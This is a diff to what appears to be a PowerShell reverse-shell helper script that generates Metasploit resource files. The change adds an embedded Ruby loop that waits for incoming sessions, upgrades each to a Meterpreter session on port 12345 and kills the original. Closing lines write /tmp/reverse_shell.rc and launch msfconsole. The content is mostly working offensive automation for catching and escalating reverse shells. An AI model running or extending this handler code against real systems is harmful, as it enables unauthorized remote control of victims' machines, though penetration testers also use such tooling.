@@ -23,12 +23,35 @@ set LHOST $Lhost
 set LPORT $Lport
 set ExitOnSession false
 exploit -j -z
-use post/multi/manage/shell_to_meterpreter
-set LHOST $Lhost
-set LPORT 12345
-set session 1
-"@
+# The first sleep below is not necessary, but makes the output cleaner
+<ruby>
+	sleep(1)
 
+	print_status("Esperando session para actualizarla a meterpreter")
+	while (true)
+		framework.sessions.each_pair do |sid,s|
+			thost = s.session_host
+
+			# Ensure that stdapi has been loaded before running
+			if s.ext.aliases['stdapi']
+				print_status("Detectada nueva session")
+				s.console.run_single("use post/multi/manage/shell_to_meterpreter")
+                s.console.run_single("set LHOST $LHOST")
+                s.console.run_single("set LPORT 12345")
+                s.console.run_single("exploit")
+				print_status("Closing session #{sid} #{thost}...")
+				s.kill
+			else
+				print_status("Session #{sid} #{thost} active, but not yet configured")
+			end
+
+		end
+		sleep(1)
+	end
+
+	print_status("All done")
+</ruby>
+"@
 
 $metasploit_ruby = @"
 use exploit/multi/handler
@@ -42,7 +65,6 @@ set LHOST $Lhost
 set LPORT 12345
 set session 1
 "@
-
 
 $metasploit_java = @"
 use exploit/multi/handler
@@ -204,4 +226,7 @@ if ($java -eq $true -and $metasploit -eq $true) {$metasploit_java | Out-File -En
 if ($xterm -eq $true -and $metasploit -eq $true) {$metasploit_xterm | Out-File -Encoding ascii -FilePath /tmp/reverse_shell.rc ; msfconsole -r /tmp/reverse_shell.rc}
 
 }
+
+
+
 
